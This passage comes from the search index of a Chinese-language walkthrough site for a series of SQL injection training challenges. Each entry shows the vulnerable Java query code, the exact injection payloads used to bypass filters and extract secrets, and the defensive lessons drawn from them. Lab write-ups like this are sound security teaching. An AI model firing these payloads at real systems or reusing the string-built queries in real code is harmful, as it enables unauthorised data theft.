\"8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck\", \"#vipCouponCode\"]; $(_0xffee[7])[_0xffee[0]](function() { var _0xe83dx1 = $(_0xffee[2])[_0xffee[1]](); var _0xe83dx2 = $[_0xffee[5]]({ type: _0xffee[3], url: _0xffee[6], data: { couponCode: _0xe83dx1 }, async: false }); })[_0xffee[0]](); \u53ef\u77e5\u8fd8\u6709\u4e2a\u8bf7\u6c42\u5730\u5740 _0xffee[6]( 8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck) \u8fd9\u4e2a\u5730\u5740 8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck \u4e0e 8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62CouponCheck \u53c2\u6570\u76f8\u540c \u540c\u6837\u5b58\u5728\u6ce8\u5165 \u8bf7\u6c42 POST /challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck HTTP/1.1 couponCode=6' union select itemId,percentOff,CONCAT('This is the couponCode: ', couponCode, ' ') from vipCoupons where itemId=2; -- \u83b7\u5f97\u8fd4\u56de Valid Coupon for %100 off This is the couponCode: spcil/|Pse3cr3etCouponStu.f4rU176 items couponCode \u4e3a spcil/|Pse3cr3etCouponStu.f4rU176 \uff0c\u4f18\u60e0100%","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/SQL-Injection-Challenge-5.html#_4","text":"\u590d\u6742\u7684\u4e1a\u52a1\u6d41\u7a0b\uff0c\u5f88\u5bb9\u6613\u5bfc\u81f4\u5b89\u5168\u95ee\u9898\uff0c\u9700\u8981\u6bcf\u4e2a\u70b9\u90fd\u505a\u7684\u5f88\u597d\u624d\u53ef\u4ee5","title":"\u603b\u7ed3"},{"location":"vul/SQL-Injection-Challenge-6.html","text":"SQL Injection Challenge 6(SQL \u6ce8\u5165 6) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u5229\u7528SQL\u6ce8\u5165\u70b9,\u83b7\u5f97\u901a\u5173\u5bc6\u94a5 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/d0e12e91dafdba4825b261ad5221aae15d28c36c7981222eb59f7fc8d8f212a2 HTTP/1.1 pinNumber=1234 \u89e3\u6790\u4ee3\u7801 userPin = userPin.replaceAll(\"\\\\\\\\\", \"\\\\\\\\\\\\\\\\\").replaceAll(\"'\", \"\"); // Escape single quotes log.debug(\"userPin scrubbed - \" + userPin); userPin = java.net.URLDecoder.decode(userPin.replaceAll(\"\\\\\\\\\\\\\\\\x\", \"%\"), \"UTF-8\"); //Decode \\x encoding log.debug(\"searchTerm decoded to - \" + userPin); Connection conn = Database.getChallengeConnection(applicationRoot, \"SqlChallengeSix\"); log.debug(\"Looking for users\"); PreparedStatement prepstmt = conn.prepareStatement(\"SELECT userName FROM users WHERE userPin = '\" + userPin + \"'\"); ResultSet users = prepstmt.executeQuery(); \u5355\u5f15\u53f7\u88ab\u8fc7\u6ee4\u4e86 \u4f46\u8fd9\u4e2a\u9898\u4f1a\u63a5\u6536URL\u7f16\u7801\uff0c\u56e0\u6b64\u7ed5\u8fc7\u4e86\u7b2c\u4e00\u6b65\u7684\u5355\u5f15\u53f7\u8fc7\u6ee4 \u89e3\u9898\u6b65\u9aa4 \u00b6 \u53ea\u9700\u8981\u4f7f\u7528\\x27 \u4ee3\u66ff\u5355\u5f15\u53f7\u5373\u53ef \\x27\\x20UNION\\x20SELECT\\x20userAnswer\\x20FROM\\x20users\\x20WHERE\\x20userName\\x20\\x3D\\x20\\x27Brendan\\x27\\x3B\\x20--\\x20 \u603b\u7ed3 \u00b6 \u5b89\u5168\u8fc7\u6ee4\u7684\u987a\u5e8f\u975e\u5e38\u7684\u91cd\u8981\uff0c\u5982\u679c\u5c06url\u89e3\u7801\u548c\u5355\u5f15\u53f7\u8fc7\u6ee4\u529f\u80fd\u4e92\u6362\u5373\u53ef\u8fbe\u5230\u5b89\u5168\u6821\u9a8c\u6548\u679c","title":"SQL Injection Challenge 6(SQL \u6ce8\u5165 6)"},{"location":"vul/SQL-Injection-Challenge-6.html#sql-injection-challenge-6sql-6","text":"","title":"SQL Injection Challenge 6(SQL \u6ce8\u5165 6)"},{"location":"vul/SQL-Injection-Challenge-6.html#_1","text":"\u5229\u7528SQL\u6ce8\u5165\u70b9,\u83b7\u5f97\u901a\u5173\u5bc6\u94a5","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/SQL-Injection-Challenge-6.html#_2","text":"\u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/d0e12e91dafdba4825b261ad5221aae15d28c36c7981222eb59f7fc8d8f212a2 HTTP/1.1 pinNumber=1234 \u89e3\u6790\u4ee3\u7801 userPin = userPin.replaceAll(\"\\\\\\\\\", \"\\\\\\\\\\\\\\\\\").replaceAll(\"'\", \"\"); // Escape single quotes log.debug(\"userPin scrubbed - \" + userPin); userPin = java.net.URLDecoder.decode(userPin.replaceAll(\"\\\\\\\\\\\\\\\\x\", \"%\"), \"UTF-8\"); //Decode \\x encoding log.debug(\"searchTerm decoded to - \" + userPin); Connection conn = Database.getChallengeConnection(applicationRoot, \"SqlChallengeSix\"); log.debug(\"Looking for users\"); PreparedStatement prepstmt = conn.prepareStatement(\"SELECT userName FROM users WHERE userPin = '\" + userPin + \"'\"); ResultSet users = prepstmt.executeQuery(); \u5355\u5f15\u53f7\u88ab\u8fc7\u6ee4\u4e86 \u4f46\u8fd9\u4e2a\u9898\u4f1a\u63a5\u6536URL\u7f16\u7801\uff0c\u56e0\u6b64\u7ed5\u8fc7\u4e86\u7b2c\u4e00\u6b65\u7684\u5355\u5f15\u53f7\u8fc7\u6ee4","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/SQL-Injection-Challenge-6.html#_3","text":"\u53ea\u9700\u8981\u4f7f\u7528\\x27 \u4ee3\u66ff\u5355\u5f15\u53f7\u5373\u53ef \\x27\\x20UNION\\x20SELECT\\x20userAnswer\\x20FROM\\x20users\\x20WHERE\\x20userName\\x20\\x3D\\x20\\x27Brendan\\x27\\x3B\\x20--\\x20","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/SQL-Injection-Challenge-6.html#_4","text":"\u5b89\u5168\u8fc7\u6ee4\u7684\u987a\u5e8f\u975e\u5e38\u7684\u91cd\u8981\uff0c\u5982\u679c\u5c06url\u89e3\u7801\u548c\u5355\u5f15\u53f7\u8fc7\u6ee4\u529f\u80fd\u4e92\u6362\u5373\u53ef\u8fbe\u5230\u5b89\u5168\u6821\u9a8c\u6548\u679c","title":"\u603b\u7ed3"},{"location":"vul/SQL-Injection-Challenge-7.html","text":"SQL Injection Challenge 7(SQL \u6ce8\u5165 7) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u5229\u7528SQL\u6ce8\u5165 \u767b\u5f55\u7cfb\u7edf \u529f\u80fd\u5b9e\u73b0 \u00b6 \u539f\u59cb\u4ee3\u7801 String subEmail = Validate.validateParameter(request.getParameter(\"subEmail\"), 60); log.debug(\"subEmail - \" + subEmail.replaceAll(\"\\n\", \" \\\\\\\\n \")); //Escape \\n's String subPassword = Validate.validateParameter(request.getParameter(\"subPassword\"), 40); log.debug(\"subPassword - \" + subPassword); boolean validEmail = Validate.isValidEmailAddress(subEmail.replaceAll(\"\\n\", \"\")); //Ignore \\n 's \u9a8c\u8bc1\u90ae\u7bb1 if(!subPassword.isEmpty() && !subPassword.isEmpty() && validEmail) { Connection conn = Database.getChallengeConnection(applicationRoot, \"SqlChallengeSeven\"); try { log.debug(\"Signing in with subitted details\"); PreparedStatement prepstmt = conn.prepareStatement(\"SELECT userName FROM users WHERE userEmail = '\" + subEmail + \"' AND userPassword = ?;\"); //\u90ae\u7bb1\u662f\u53ef\u4ee5\u6ce8\u5165\u7684 prepstmt.setString(1, subPassword); ResultSet users = prepstmt.executeQuery(); if(users.next()) { htmlOutput = \"<h3>\" + bundle.getString(\"response.welcome\")+ \" \" + Encode.forHtml(users.getString(1)) + \"</h3>\" + \"<p>\" + bundle.getString(\"response.resultKey\")+ \"\" + Hash.generateUserSolution(Getter.getModuleResultFromHash(applicationRoot, levelHash), (String)ses.getAttribute(\"userName\")) + \"</p>\"; } else { htmlOutput = \"<h3>\" + bundle.getString(\"response.incorrectCreds\")+ \"</h3><p>\" + bundle.getString(\"response.carefulNow\")+ \"</p>\"; } } catch(Exception e) \u89e3\u9898\u6b65\u9aa4 \u00b6 subEmail=te%40qq.com'%0aor%0a1%3D1%0aor%0a'23'!='&subPassword=passtest%40qq.com \u9700\u8981\u7528\u5230 %0a \u8fdb\u884c\u5206\u5272 \u603b\u7ed3 \u00b6","title":"SQL Injection Challenge 7(SQL \u6ce8\u5165 7)"},{"location":"vul/SQL-Injection-Challenge-7.html#sql-injection-challenge-7sql-7","text":"","title":"SQL Injection Challenge 7(SQL \u6ce8\u5165 7)"},{"location":"vul/SQL-Injection-Challenge-7.html#_1","text":"\u5229\u7528SQL\u6ce8\u5165 \u767b\u5f55\u7cfb\u7edf","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/SQL-Injection-Challenge-7.html#_2","text":"\u539f\u59cb\u4ee3\u7801 String subEmail = Validate.validateParameter(request.getParameter(\"subEmail\"), 60); log.debug(\"subEmail - \" + subEmail.replaceAll(\"\\n\", \" \\\\\\\\n \")); //Escape \\n's String subPassword = Validate.validateParameter(request.getParameter(\"subPassword\"), 40); log.debug(\"subPassword - \" + subPassword); boolean validEmail = Validate.isValidEmailAddress(subEmail.replaceAll(\"\\n\", \"\")); //Ignore \\n 's \u9a8c\u8bc1\u90ae\u7bb1 if(!subPassword.isEmpty() && !subPassword.isEmpty() && validEmail) { Connection conn = Database.getChallengeConnection(applicationRoot, \"SqlChallengeSeven\"); try { log.debug(\"Signing in with subitted details\"); PreparedStatement prepstmt = conn.prepareStatement(\"SELECT userName FROM users WHERE userEmail = '\" + subEmail + \"' AND userPassword = ?;\"); //\u90ae\u7bb1\u662f\u53ef\u4ee5\u6ce8\u5165\u7684 prepstmt.setString(1, subPassword); ResultSet users = prepstmt.executeQuery(); if(users.next()) { htmlOutput = \"<h3>\" + bundle.getString(\"response.welcome\")+ \" \" + Encode.forHtml(users.getString(1)) + \"</h3>\" + \"<p>\" + bundle.getString(\"response.resultKey\")+ \"\" + Hash.generateUserSolution(Getter.getModuleResultFromHash(applicationRoot, levelHash), (String)ses.getAttribute(\"userName\")) + \"</p>\"; } else { htmlOutput = \"<h3>\" + bundle.getString(\"response.incorrectCreds\")+ \"</h3><p>\" + bundle.getString(\"response.carefulNow\")+ \"</p>\"; } } catch(Exception e)","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/SQL-Injection-Challenge-7.html#_3","text":"subEmail=te%40qq.com'%0aor%0a1%3D1%0aor%0a'23'!='&subPassword=passtest%40qq.com \u9700\u8981\u7528\u5230 %0a \u8fdb\u884c\u5206\u5272","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/SQL-Injection-Challenge-7.html#_4","text":"","title":"\u603b\u7ed3"},{"location":"vul/SQL-Injection-Challenge-One.html","text":"SQL Injection Challenge One(SQL \u6ce8\u5165 1) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u8fd9\u4e2a\u662fSQL\u6ce8\u5165\u6311\u6218\u9898\uff0c\u9700\u8981\u901a\u8fc7\u8f93\u5165\u6846\u8fd9\u4e2a\u6ce8\u5165\u70b9\uff0c\u83b7\u5f97\u901a\u5173\u5bc6\u94a5 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u968f\u4fbf\u8f93\u5165\u4e00\u4e2a\u6570\uff0c\u70b9\u51fb \u67e5\u8be2\u7528\u6237 \u6309\u94ae\uff0c\u67e5\u770b\u8bf7\u6c42\u5305 POST /challenges/e1e109444bf5d7ae3d67b816538613e64f7d0f51c432a164efc8418513711b0a HTTP/1.1 aUserId=1 \u5bf9\u5e94\u7684\u540e\u7aef\u6587\u4ef6 src/main/java/servlets/module/challenge/SqlInjection1.java String aUserId = request.getParameter(\"aUserId\"); log.debug(\"User Submitted - \" + aUserId); String ApplicationRoot = getServletContext().getRealPath(\"\"); log.debug(\"Servlet root = \" + ApplicationRoot ); log.debug(\"Getting Connection to Database\"); Connection conn = Database.getChallengeConnection(ApplicationRoot, \"SqlChallengeOne\"); Statement stmt = conn.createStatement(); log.debug(\"Gathering result set\"); ResultSet resultSet = stmt.executeQuery(\"SELECT * FROM customers WHERE customerId = \\\"\" + aUserId + \"\\\"\"); // SQL\u8bed\u53e5 \u4f7f\u7528\u7684 \u53cc\u5f15\u53f7 ,\u9700\u8981\u8fdb\u884c\u95ed\u5408\u53cc\u5f15\u53f7 \u89e3\u9898\u6b65\u9aa4 \u00b6 \u7531\u4e8e\u540e\u7aefSQL\u8bed\u53e5\u4f7f\u7528\u7684\u662f\u53cc\u5f15\u53f7\uff0c\u56e0\u6b64\u6ce8\u5165\u65f6\uff0c\u9700\u8981\u95ed\u5408\u53cc\u5f15\u53f7\u624d\u80fd\u5230\u8fbe\u6ce8\u5165\u7684\u76ee\u7684 \u6240\u4ee5\u5f53\u8f93\u5165 1\" or \"1\"=\"1 \u6700\u7ec8SQL\u8bed\u53e5 SELECT * FROM customers WHERE customerId = \"1\" or \"1\"=\"1\" \u662f\u4e00\u4e2a\u6c38\u771f\u5f0f\uff0c\u8fbe\u5230\u6ce8\u5165\u7684\u76ee\u7684 \u603b\u7ed3 \u00b6 SQL\u6ce8\u5165\u7684\u6838\u5fc3\u662f\u901a\u8fc7\u63a7\u5236\u95ee\u9898SQL\u8bed\u53e5\uff0c\u6ce8\u5165SQL\u6307\u4ee4\uff0c\u9700\u8981\u4fdd\u8bc1\u539f\u59cbSQL\u8bed\u6cd5\u6b63\u786e \u7814\u53d1\u7684SQL\u4f7f\u7528\u7684\u662f\u5355\u5f15\u53f7\uff0c\u6ce8\u5165\u65f6\u5219\u9700\u8981\u4f7f\u7528\u5355\u5f15\u53f7 \u7814\u53d1\u7684SQL\u4f7f\u7528\u53cc\u5f15\u53f7\uff0c\u6ce8\u5165\u65f6\u5219\u9700\u8981\u4f7f\u7528\u53cc\u5f15\u53f7 \u7814\u53d1\u7684SQL\u662f\u4e00\u4e2aint\u578b\uff0c\u6ce8\u5165\u65f6\u5219\u4e0d\u9700\u8981\u8fdb\u884c\u4efb\u4f55\u95ed\u5408 \u7814\u53d1\u9632\u5fa1\u65b9\u6848\u57fa\u672c\u7c7b\u4f3c: \u7528\u6237\u8f93\u5165\u53c2\u6570\u8fdb\u884c\u767d\u540d\u5355\u6821\u9a8c SQL\u67e5\u8be2\u4f7f\u7528\u9884\u7f16\u8bd1\u67e5\u8be2 \u6c49\u5316\u8bf4\u660e \u00b6 \u6dfb\u52a0\u6587\u4ef6 src/main/resources/i18n/challenges/injection/e1e109444bf5d7ae3d67b816538613e64f7d0f51c432a164efc8418513711b0a_zh.properties","title":"SQL Injection Challenge One(SQL \u6ce8\u5165 1)"},{"location":"vul/SQL-Injection-Challenge-One.html#sql-injection-challenge-onesql-1","text":"","title":"SQL Injection Challenge One(SQL \u6ce8\u5165 1)"},{"location":"vul/SQL-Injection-Challenge-One.html#_1","text":"\u8fd9\u4e2a\u662fSQL\u6ce8\u5165\u6311\u6218\u9898\uff0c\u9700\u8981\u901a\u8fc7\u8f93\u5165\u6846\u8fd9\u4e2a\u6ce8\u5165\u70b9\uff0c\u83b7\u5f97\u901a\u5173\u5bc6\u94a5","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/SQL-Injection-Challenge-One.html#_2","text":"\u968f\u4fbf\u8f93\u5165\u4e00\u4e2a\u6570\uff0c\u70b9\u51fb \u67e5\u8be2\u7528\u6237 \u6309\u94ae\uff0c\u67e5\u770b\u8bf7\u6c42\u5305 POST /challenges/e1e109444bf5d7ae3d67b816538613e64f7d0f51c432a164efc8418513711b0a HTTP/1.1 aUserId=1 \u5bf9\u5e94\u7684\u540e\u7aef\u6587\u4ef6 src/main/java/servlets/module/challenge/SqlInjection1.java String aUserId = request.getParameter(\"aUserId\"); log.debug(\"User Submitted - \" + aUserId); String ApplicationRoot = getServletContext().getRealPath(\"\"); log.debug(\"Servlet root = \" + ApplicationRoot ); log.debug(\"Getting Connection to Database\"); Connection conn = Database.getChallengeConnection(ApplicationRoot, \"SqlChallengeOne\"); Statement stmt = conn.createStatement(); log.debug(\"Gathering result set\"); ResultSet resultSet = stmt.executeQuery(\"SELECT * FROM customers WHERE customerId = \\\"\" + aUserId + \"\\\"\"); // SQL\u8bed\u53e5 \u4f7f\u7528\u7684 \u53cc\u5f15\u53f7 ,\u9700\u8981\u8fdb\u884c\u95ed\u5408\u53cc\u5f15\u53f7","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/SQL-Injection-Challenge-One.html#_3","text":"\u7531\u4e8e\u540e\u7aefSQL\u8bed\u53e5\u4f7f\u7528\u7684\u662f\u53cc\u5f15\u53f7\uff0c\u56e0\u6b64\u6ce8\u5165\u65f6\uff0c\u9700\u8981\u95ed\u5408\u53cc\u5f15\u53f7\u624d\u80fd\u5230\u8fbe\u6ce8\u5165\u7684\u76ee\u7684 \u6240\u4ee5\u5f53\u8f93\u5165 1\" or \"1\"=\"1 \u6700\u7ec8SQL\u8bed\u53e5 SELECT * FROM customers WHERE customerId = \"1\" or \"1\"=\"1\" \u662f\u4e00\u4e2a\u6c38\u771f\u5f0f\uff0c\u8fbe\u5230\u6ce8\u5165\u7684\u76ee\u7684","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/SQL-Injection-Challenge-One.html#_4","text":"SQL\u6ce8\u5165\u7684\u6838\u5fc3\u662f\u901a\u8fc7\u63a7\u5236\u95ee\u9898SQL\u8bed\u53e5\uff0c\u6ce8\u5165SQL\u6307\u4ee4\uff0c\u9700\u8981\u4fdd\u8bc1\u539f\u59cbSQL\u8bed\u6cd5\u6b63\u786e \u7814\u53d1\u7684SQL\u4f7f\u7528\u7684\u662f\u5355\u5f15\u53f7\uff0c\u6ce8\u5165\u65f6\u5219\u9700\u8981\u4f7f\u7528\u5355\u5f15\u53f7 \u7814\u53d1\u7684SQL\u4f7f\u7528\u53cc\u5f15\u53f7\uff0c\u6ce8\u5165\u65f6\u5219\u9700\u8981\u4f7f\u7528\u53cc\u5f15\u53f7 \u7814\u53d1\u7684SQL\u662f\u4e00\u4e2aint\u578b\uff0c\u6ce8\u5165\u65f6\u5219\u4e0d\u9700\u8981\u8fdb\u884c\u4efb\u4f55\u95ed\u5408 \u7814\u53d1\u9632\u5fa1\u65b9\u6848\u57fa\u672c\u7c7b\u4f3c: \u7528\u6237\u8f93\u5165\u53c2\u6570\u8fdb\u884c\u767d\u540d\u5355\u6821\u9a8c SQL\u67e5\u8be2\u4f7f\u7528\u9884\u7f16\u8bd1\u67e5\u8be2","title":"\u603b\u7ed3"},{"location":"vul/SQL-Injection-Challenge-One.html#_5","text":"\u6dfb\u52a0\u6587\u4ef6 src/main/resources/i18n/challenges/injection/e1e109444bf5d7ae3d67b816538613e64f7d0f51c432a164efc8418513711b0a_zh.properties","title":"\u6c49\u5316\u8bf4\u660e"},{"location":"vul/SQL-Injection-Challenge-Three.html","text":"SQL Injection Challenge Three(SQL \u6ce8\u5165 3 ) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u9700\u8981\u5229\u7528SQL\u6ce8\u5165\u70b9\u83b7\u5f97\u7528\u6237Mary Martin\u7684\u4fe1\u7528\u5361\u53f7\u5b57\u6bb5\u7684\u503c \u529f\u80fd\u5b9e\u73b0 \u00b6 \u8bf7\u6c42\u7684\u6570\u636e\u5305 POST /challenges/b7327828a90da59df54b27499c0dc2e875344035e38608fcfb7c1ab8924923f6 HTTP/1.1 theUserName=%22+or+%221%22%3D%221 \u5bf9\u5e94\u7684\u89e3\u6790\u6587\u4ef6 src/main/java/servlets/module/challenge/SqlInjection3.java log.debug(\"User Submitted - \" + theUserName); theUserName = SqlFilter.levelThree(theUserName); //\u8fdb\u884c\u4e86\u8fc7\u6ee4 log.debug(\"Filtered to \" + theUserName); String ApplicationRoot = getServletContext().getRealPath(\"\"); log.debug(\"Servlet root = \" + ApplicationRoot ); log.debug(\"Getting Connection to Database\"); Connection conn = Database.getChallengeConnection(ApplicationRoot, \"SqlChallengeThree\"); Statement stmt = conn.createStatement(); log.debug(\"Gathering result set\"); ResultSet resultSet = stmt.executeQuery(\"SELECT customerName FROM customers WHERE customerName = '\" + theUserName + \"'\"); // \u5177\u4f53\u8fc7\u6ee4\u4ee3\u7801 public static String SqlFilter.levelThree (String input) { log.debug(\"Filtering input at SQL levelThree\"); input = input.toLowerCase(); input = input.replaceAll(\"|\", \"\").replaceAll(\"&\", \"\").replaceAll(\"!\", \"\").replaceAll(\"-\", \"\").replaceAll(\";\", \"\"); while(input.contains(\"or\") || input.contains(\"true\") || input.contains(\"false\") || input.contains(\"and\") || input.contains(\"is\")) //\u4e0d\u5141\u8bb8\u51fa\u73b0\u8fd9\u4e9b\u5b57\u7b26 input = input.replaceAll(\"or\", \"\").replaceAll(\"true\", \"\").replaceAll(\"and\", \"\").replaceAll(\"false\", \"\").replaceAll(\"is\", \"\"); return input; } \u89e3\u9898\u6b65\u9aa4 \u00b6 \u5f53\u524dSQL\u662f\u67e5\u8be2\u7528\u6237\u540d\uff0c\u8981\u60f3\u83b7\u5f97\u53e6\u4e00\u4e2a\u4fe1\u7528\u5361\u5b57\u6bb5\uff0c\u5fc5\u987b\u4f7f\u7528\u8054\u5408\u67e5\u8be2\uff0c\u56e0\u6b64\u6784\u9020\u8054\u5408\u67e5\u8be2\u5373\u53ef Mary Martin' union select creditcardnumber from customers where customername='Mary Martin'# \u600e\u6837\u731c\u5230\u4fe1\u7528\u5361\u5b57\u6bb5? \u6839\u636e\u9898\u7684\u8bf4\u660e\u5373\u53ef\uff0c\u62fc\u63a5\u51fa\u6765 \u603b\u7ed3 \u00b6 \u7531\u4e8e\u8f93\u5165\u9a8c\u8bc1\u4e0d\u5f53\u5bfc\u81f4\u7684\u95ee\u9898\uff0c\u589e\u52a0\u4e00\u4e9b\u6821\u9a8c\uff0c\u5c31\u4f1a\u63d0\u9ad8\u4e00\u4e9b\u653b\u51fb\u95e8\u69db","title":"SQL Injection Challenge Three(SQL \u6ce8\u5165 3 )"},{"location":"vul/SQL-Injection-Challenge-Three.html#sql-injection-challenge-threesql-3","text":"","title":"SQL Injection Challenge Three(SQL \u6ce8\u5165 3 )"},{"location":"vul/SQL-Injection-Challenge-Three.html#_1","text":"\u9700\u8981\u5229\u7528SQL\u6ce8\u5165\u70b9\u83b7\u5f97\u7528\u6237Mary Martin\u7684\u4fe1\u7528\u5361\u53f7\u5b57\u6bb5\u7684\u503c","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/SQL-Injection-Challenge-Three.html#_2","text":"\u8bf7\u6c42\u7684\u6570\u636e\u5305 POST /challenges/b7327828a90da59df54b27499c0dc2e875344035e38608fcfb7c1ab8924923f6 HTTP/1.1 theUserName=%22+or+%221%22%3D%221 \u5bf9\u5e94\u7684\u89e3\u6790\u6587\u4ef6 src/main/java/servlets/module/challenge/SqlInjection3.java log.debug(\"User Submitted - \" + theUserName); theUserName = SqlFilter.levelThree(theUserName); //\u8fdb\u884c\u4e86\u8fc7\u6ee4 log.debug(\"Filtered to \" + theUserName); String ApplicationRoot = getServletContext().getRealPath(\"\"); log.debug(\"Servlet root = \" + ApplicationRoot ); log.debug(\"Getting Connection to Database\"); Connection conn = Database.getChallengeConnection(ApplicationRoot, \"SqlChallengeThree\"); Statement stmt = conn.createStatement(); log.debug(\"Gathering result set\"); ResultSet resultSet = stmt.executeQuery(\"SELECT customerName FROM customers WHERE customerName = '\" + theUserName + \"'\"); // \u5177\u4f53\u8fc7\u6ee4\u4ee3\u7801 public static String SqlFilter.levelThree (String input) { log.debug(\"Filtering input at SQL levelThree\"); input = input.toLowerCase(); input = input.replaceAll(\"|\", \"\").replaceAll(\"&\", \"\").replaceAll(\"!\", \"\").replaceAll(\"-\", \"\").replaceAll(\";\", \"\"); while(input.contains(\"or\") || input.contains(\"true\") || input.contains(\"false\") || input.contains(\"and\") || input.contains(\"is\")) //\u4e0d\u5141\u8bb8\u51fa\u73b0\u8fd9\u4e9b\u5b57\u7b26 input = input.replaceAll(\"or\", \"\").replaceAll(\"true\", \"\").replaceAll(\"and\", \"\").replaceAll(\"false\", \"\").replaceAll(\"is\", \"\"); return input; }","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/SQL-Injection-Challenge-Three.html#_3","text":"\u5f53\u524dSQL\u662f\u67e5\u8be2\u7528\u6237\u540d\uff0c\u8981\u60f3\u83b7\u5f97\u53e6\u4e00\u4e2a\u4fe1\u7528\u5361\u5b57\u6bb5\uff0c\u5fc5\u987b\u4f7f\u7528\u8054\u5408\u67e5\u8be2\uff0c\u56e0\u6b64\u6784\u9020\u8054\u5408\u67e5\u8be2\u5373\u53ef Mary Martin' union select creditcardnumber from customers where customername='Mary Martin'# \u600e\u6837\u731c\u5230\u4fe1\u7528\u5361\u5b57\u6bb5? \u6839\u636e\u9898\u7684\u8bf4\u660e\u5373\u53ef\uff0c\u62fc\u63a5\u51fa\u6765","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/SQL-Injection-Challenge-Three.html#_4","text":"\u7531\u4e8e\u8f93\u5165\u9a8c\u8bc1\u4e0d\u5f53\u5bfc\u81f4\u7684\u95ee\u9898\uff0c\u589e\u52a0\u4e00\u4e9b\u6821\u9a8c\uff0c\u5c31\u4f1a\u63d0\u9ad8\u4e00\u4e9b\u653b\u51fb\u95e8\u69db","title":"\u603b\u7ed3"},{"location":"vul/SQL-Injection-Challenge-Two.html","text":"SQL Injection Challenge Two(SQL\u6ce8\u5165\u6311\u6218 2) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u9700\u8981\u5229\u7528\u4e00\u4e2aSQL\u6ce8\u5165\u70b9\uff0c\u83b7\u5f97\u901a\u5173\u5bc6\u94a5 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u70b9\u51fb\u67e5\u8be2\u7528\u6237,\u83b7\u5f97\u5bf9\u5e94\u8bf7\u6c42 POST /challenges/ffd39cb26727f34cbf9fce3e82b9d703404e99cdef54d2aa745f497abe070b HTTP/1.1 userIdentity=test%40qq.com%22+or+%221%22%3D%221 \u5bf9\u5e94\u4ee3\u7801\u6587\u4ef6 src/main/java/servlets/module/challenge/SqlInjectionEmail.java String userIdentity = request.getParameter(\"userIdentity\"); log.debug(\"User Submitted - \" + userIdentity); if(Validate.isValidEmailAddress(userIdentity)) { log.debug(\"Filtered to \" + userIdentity); String ApplicationRoot = getServletContext().getRealPath(\"\"); log.debug(\"Servlet root = \" + ApplicationRoot ); log.debug(\"Getting Connection to Database\"); Connection conn = Database.getChallengeConnection(ApplicationRoot, \"SqlChallengeEmail\"); Statement stmt = conn.createStatement(); log.debug(\"Gathering result set\"); ResultSet resultSet = stmt.executeQuery(\"SELECT * FROM customers WHERE customerAddress = '\" + userIdentity + \"'\"); \u83b7\u5f97 userIdentity \u53c2\u6570\u540e\uff0c\u8fdb\u884c\u4e86SQL\u67e5\u8be2\uff0c\u4f46\u4e2d\u95f4\u8c03\u7528Validate.isValidEmailAddress \u8fdb\u884c\u4e86\u4e00\u6b21\u5bf9\u53c2\u6570\u8fc7\u6ee4\uff0c\u5224\u65ad\u662f\u5426\u662f\u5408\u6cd5\u7684\u90ae\u7bb1\u5730\u5740 \uff0c\u8be6\u7ec6\u4ee3\u7801\u5982\u4e0b public static boolean isValidEmailAddress(String email) { boolean result = true; try { log.debug(\"About to crash\"); InternetAddress emailAddr = new InternetAddress(email); log.debug(\"Did we crash\"); emailAddr.validate(); log.debug(\"Didn't crash\"); } catch (AddressException ex) { result = false; } return result; } \u901a\u8fc7InternetAddress \u7c7b\u8fdb\u884c\u5224\u65ad\u7684\uff0c\u56e0\u6b64\u8981\u60f3\u6210\u529f\u6ce8\u5165\u83b7\u53d6\u7ed3\u679c\uff0c\u9996\u5148\u8981\u7ed5\u8fc7InternetAddress\u7c7b\u7684\u68c0\u6d4b\uff0c\u7ecf\u8fc7\u6d4b\u8bd5\u8be5\u7c7b\u4e0d\u5141\u8bb8\u90ae\u7bb1\u5730\u5740\u5b58\u5728\u7a7a\u683c \u89e3\u9898\u6b65\u9aa4 \u00b6 \u4e0d\u80fd\u8f93\u5165\u7a7a\u683c\uff0c\u53ef\u4ee5\u4f7f\u7528\u5f88\u591a\u65b9\u6cd5\u7ed5\u8fc7\u68c0\u6d4b \u5982 test@qq.com 'or'1'='1 \uff0c\u6700\u7ec8\u6267\u884c\u7684SQL\u53d8\u6210 SELECT * FROM customers WHERE customerAddress = 'test@qq.com'or'1'='1' \u603b\u7ed3 \u00b6 \u5728\u5f00\u53d1\u6307\u5357\u4e2d\uff0c\u6211\u4eec\u7ecf\u5e38\u8981\u6c42\u8fdb\u884c\u8f93\u5165\u9a8c\u8bc1\uff0c\u4f46\u672c\u9898\u505a\u4e86\u8f93\u5165\u9a8c\u8bc1\uff0c\u4ecd\u7136\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\uff0c\u8bf4\u660e\u80fd\u591f\u5b9e\u73b0\u6b63\u786e\u7684\u8f93\u5165\u9a8c\u8bc1\u5e76\u975e\u6613\u4e8b 